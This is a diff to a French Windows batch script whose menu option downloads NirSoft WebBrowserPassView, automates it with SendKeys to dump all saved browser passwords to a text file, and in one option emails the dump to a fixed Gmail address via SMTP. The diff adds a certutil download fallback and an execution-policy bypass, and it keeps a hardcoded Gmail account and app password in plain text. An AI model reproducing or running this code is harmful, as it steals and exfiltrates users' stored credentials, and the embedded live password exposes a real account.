@@ -711,12 +711,12 @@ echo   Export mots de passe navigateurs (Nirsoft)
 echo ===============================================
 echo.
 
-set "BPV_EXE=%~dp0WebBrowserPassView.exe"
-set "BPV_DOWNLOAD_URL=https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe"
-set "BPV_EMAIL=alexandre.janacek@gmail.com"
-set "BPV_DOWNLOADED=0"
-set "BPV_SMTP_USER=alexandre.janacek@gmail.com"
-set "BPV_SMTP_PASS=vdhljbthvrdyneon"
+set "WBPV=%~dp0WebBrowserPassView.exe"
+set "DOWNLOAD_URL=https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe"
+set "EMAIL=alexandre.janacek@gmail.com"
+set "DOWNLOADED=0"
+set "SMTP_USER=alexandre.janacek@gmail.com"
+set "SMTP_PASS=vdhljbthvrdyneon"
 
 :bpv_menu
 cls
@@ -731,38 +731,43 @@ echo 0. Retour
 echo.
 set /p bpv_choice="Choisissez une option (1, 2 ou 0): "
 
-if "%bpv_choice%"=="1" goto bpv_export
-if "%bpv_choice%"=="2" goto bpv_export_and_send
+if "%bpv_choice%"=="1" goto EXPORT
+if "%bpv_choice%"=="2" goto EXPORT_AND_SEND
 if "%bpv_choice%"=="0" goto system_tools
 goto bpv_menu
 
-:bpv_export
+:EXPORT
 rem Telecharger si necessaire
-if not exist "%BPV_EXE%" (
+if not exist "%WBPV%" (
   echo.
   echo Telechargement de WebBrowserPassView.exe...
-  powershell -Command "try { Invoke-WebRequest -Uri '%BPV_DOWNLOAD_URL%' -OutFile '%BPV_EXE%' -UseBasicParsing; Write-Host 'Telechargement termine!' -ForegroundColor Green } catch { Write-Host 'Erreur:' $_.Exception.Message -ForegroundColor Red; exit 1 }"
+  curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
+  if not exist "%WBPV%" (
+    echo Erreur: Telechargement echoue.
+    pause
+    goto bpv_menu
+  )
   if %errorlevel% neq 0 (
     echo Erreur lors du telechargement.
     pause
     goto bpv_menu
   )
-  set "BPV_DOWNLOADED=1"
+  set "DOWNLOADED=1"
   timeout /t 1 /nobreak >nul
 )
 
 rem Generer un nom de fichier unique
-call :bpv_get_unique_filename
-set "BPV_OUTPUT=%BPV_UNIQUE_FILE%"
+call :GET_UNIQUE_FILENAME
+set "OUTPUT=%UNIQUE_FILE%"
 
 echo.
 echo Lancement de WebBrowserPassView...
-start "" "%BPV_EXE%"
+start "" "%WBPV%"
 
 timeout /t 5 /nobreak >nul
 
 echo Traitement en cours...
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 5000; $wsh.SendKeys('%BPV_OUTPUT%{ENTER}')" >nul 2>&1
+powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 5000; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1
 
 timeout /t 3 /nobreak >nul
 
@@ -772,16 +777,16 @@ rem Attendre que le processus se termine completement
 timeout /t 2 /nobreak >nul
 
 rem Nettoyage si telecharge
-if "%BPV_DOWNLOADED%"=="1" (
+if "%DOWNLOADED%"=="1" (
   echo Nettoyage...
-  del /F /Q "%BPV_EXE%" >nul 2>&1
-  if exist "%BPV_EXE%" (
-    powershell -Command "Remove-Item -Path '%BPV_EXE%' -Force" >nul 2>&1
+  del /F /Q "%WBPV%" >nul 2>&1
+  if exist "%WBPV%" (
+    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
   )
 )
 
-if exist "%BPV_OUTPUT%" (
-  echo Termine. Fichier sauvegarde: %BPV_OUTPUT%
+if exist "%OUTPUT%" (
+  echo Termine. Fichier sauvegarde: %OUTPUT%
   echo.
   echo Retour au menu precedent dans 2 secondes...
   timeout /t 2 /nobreak >nul
@@ -792,33 +797,38 @@ if exist "%BPV_OUTPUT%" (
   goto bpv_menu
 )
 
-:bpv_export_and_send
+:EXPORT_AND_SEND
 rem Telecharger si necessaire
-if not exist "%BPV_EXE%" (
+if not exist "%WBPV%" (
   echo.
   echo Telechargement de WebBrowserPassView.exe...
-  powershell -Command "try { Invoke-WebRequest -Uri '%BPV_DOWNLOAD_URL%' -OutFile '%BPV_EXE%' -UseBasicParsing; Write-Host 'Telechargement termine!' -ForegroundColor Green } catch { Write-Host 'Erreur:' $_.Exception.Message -ForegroundColor Red; exit 1 }"
+  curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
+  if not exist "%WBPV%" (
+    echo Erreur: Telechargement echoue.
+    pause
+    goto bpv_menu
+  )
   if %errorlevel% neq 0 (
     echo Erreur lors du telechargement.
     pause
     goto bpv_menu
   )
-  set "BPV_DOWNLOADED=1"
+  set "DOWNLOADED=1"
   timeout /t 1 /nobreak >nul
 )
 
 rem Generer un nom de fichier unique
-call :bpv_get_unique_filename
-set "BPV_OUTPUT=%BPV_UNIQUE_FILE%"
+call :GET_UNIQUE_FILENAME
+set "OUTPUT=%UNIQUE_FILE%"
 
 echo.
 echo Lancement de WebBrowserPassView...
-start "" "%BPV_EXE%"
+start "" "%WBPV%"
 
 timeout /t 5 /nobreak >nul
 
 echo Traitement en cours...
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 5000; $wsh.SendKeys('%BPV_OUTPUT%{ENTER}')" >nul 2>&1
+powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 5000; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1
 
 timeout /t 3 /nobreak >nul
 
@@ -827,59 +837,31 @@ taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
 rem Attendre que le processus se termine completement
 timeout /t 2 /nobreak >nul
 
-if not exist "%BPV_OUTPUT%" (
+if not exist "%OUTPUT%" (
   echo ERREUR: Le fichier n'a pas ete cree.
-  if "%BPV_DOWNLOADED%"=="1" (
-    del /F /Q "%BPV_EXE%" >nul 2>&1
-    if exist "%BPV_EXE%" (
-      powershell -Command "Remove-Item -Path '%BPV_EXE%' -Force" >nul 2>&1
+  if "%DOWNLOADED%"=="1" (
+    del /F /Q "%WBPV%" >nul 2>&1
+    if exist "%WBPV%" (
+      powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
     )
   )
   pause
   goto bpv_menu
 )
 
-echo Fichier sauvegarde: %BPV_OUTPUT%
+echo Fichier sauvegarde: %OUTPUT%
 echo.
 echo Envoi du fichier par email...
 
-powershell -Command ^
-"$SMTPServer = 'smtp.gmail.com'; ^
-$SMTPPort = 587; ^
-$Username = '%BPV_SMTP_USER%'; ^
-$Password = '%BPV_SMTP_PASS%'; ^
-$EmailFrom = $Username; ^
-$EmailTo = '%BPV_EMAIL%'; ^
-$Subject = 'Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); ^
-$Body = 'Export automatique des mots de passe du navigateur.'; ^
-$FilePath = '%BPV_OUTPUT%'; ^
-try { ^
-    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force; ^
-    $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword); ^
-    $MailMessage = @{ ^
-        From = $EmailFrom; ^
-        To = $EmailTo; ^
-        Subject = $Subject; ^
-        Body = $Body; ^
-        SmtpServer = $SMTPServer; ^
-        Port = $SMTPPort; ^
-        UseSsl = $true; ^
-        Credential = $Credential; ^
-        Attachments = $FilePath ^
-    }; ^
-    Send-MailMessage @MailMessage; ^
-    Write-Host 'Email envoye avec succes!' -ForegroundColor Green ^
-} catch { ^
-    Write-Host 'Erreur lors de l envoi:' $_.Exception.Message -ForegroundColor Red ^
-}"
+powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe du navigateur.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att; Write-Host 'Email envoye avec succes!' -ForegroundColor Green" 
 
 rem Nettoyage si telecharge
-if "%BPV_DOWNLOADED%"=="1" (
+if "%DOWNLOADED%"=="1" (
   echo.
   echo Nettoyage...
-  del /F /Q "%BPV_EXE%" >nul 2>&1
-  if exist "%BPV_EXE%" (
-    powershell -Command "Remove-Item -Path '%BPV_EXE%' -Force" >nul 2>&1
+  del /F /Q "%WBPV%" >nul 2>&1
+  if exist "%WBPV%" (
+    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
   )
 )
 
@@ -888,17 +870,17 @@ echo Fermeture automatique dans 2 secondes...
 timeout /t 2 /nobreak >nul
 goto system_tools
 
-:bpv_get_unique_filename
-set "BPV_BASE=%~dp0passwords_export"
-set "BPV_EXT=.txt"
-set "BPV_COUNTER=0"
-set "BPV_UNIQUE_FILE=%BPV_BASE%%BPV_EXT%"
+:GET_UNIQUE_FILENAME
+set "BASE=%~dp0passwords_export"
+set "EXT=.txt"
+set "COUNTER=0"
+set "UNIQUE_FILE=%BASE%%EXT%"
 
-:bpv_check_file
-if exist "%BPV_UNIQUE_FILE%" (
-  set /a BPV_COUNTER+=1
-  set "BPV_UNIQUE_FILE=%BPV_BASE%_%BPV_COUNTER%%BPV_EXT%"
-  goto bpv_check_file
+:CHECK_FILE
+if exist "%UNIQUE_FILE%" (
+  set /a COUNTER+=1
+  set "UNIQUE_FILE=%BASE%_%COUNTER%%EXT%"
+  goto CHECK_FILE
 )
 goto :eof
 
